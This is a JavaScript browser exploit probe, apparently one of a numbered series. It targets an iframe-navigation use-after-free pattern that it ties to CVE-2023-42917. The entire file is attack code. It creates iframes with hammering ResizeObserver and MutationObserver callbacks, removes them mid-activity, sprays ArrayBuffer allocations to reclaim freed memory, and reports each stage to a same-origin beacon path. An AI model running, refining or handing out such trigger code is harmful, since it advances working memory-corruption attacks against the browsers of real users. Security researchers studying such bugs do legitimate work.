// p192 — ISOLATED iframe navigation UAF probe (CVE-2023-42917 pattern)
// Tests ONLY iframe create → pending callbacks → navigate → destroy
// This was the "improved locking" OOB write, actively exploited in wild
//
// Beacon prefix: V192-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V192-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  var done = false;
  var count = 0;
  var ROUNDS = 20;

  function round() {
    if (done || count >= ROUNDS) {
      syncB('DONE-' + count);
      return;
    }
    count++;
    syncB('R-' + count + '-START');

    var f = document.createElement('iframe');
    f.srcdoc = '<html><body><div id="target" style="width:100px;height:100px;background:red;"></div><script>' +
      'var obs = new ResizeObserver(function(entries) {' +
      '  for(var e of entries) { e.target.style.width = (Math.random()*200)+"px"; }' +
      '});' +
      'obs.observe(document.getElementById("target"));' +
      'var mo = new MutationObserver(function(muts) {' +
      '  for(var m of muts) { m.target.style.height = (Math.random()*200)+"px"; }' +
      '});' +
      'mo.observe(document.getElementById("target"), {attributes:true});' +
      'setInterval(function(){document.getElementById("target").setAttribute("data-x",Math.random());},1);' +
      '</script></body></html>';

    document.body.appendChild(f);

    setTimeout(function() {
      try {
        syncB('R-' + count + '-NAV');
        f.srcdoc = '';
        setTimeout(function() {
          syncB('R-' + count + '-REMOVE');
          f.remove();
          f = null;

          for (var g = 0; g < 10000; g++) {
            var tmp = new ArrayBuffer(64);
          }

          syncB('R-' + count + '-DONE');
          setTimeout(round, 10);
        }, 5);
      } catch(e) {
        syncB('R-' + count + '-ERR');
      }
    }, 50);
  }

  round();
  setTimeout(function() { done = true; }, 15000);
})();
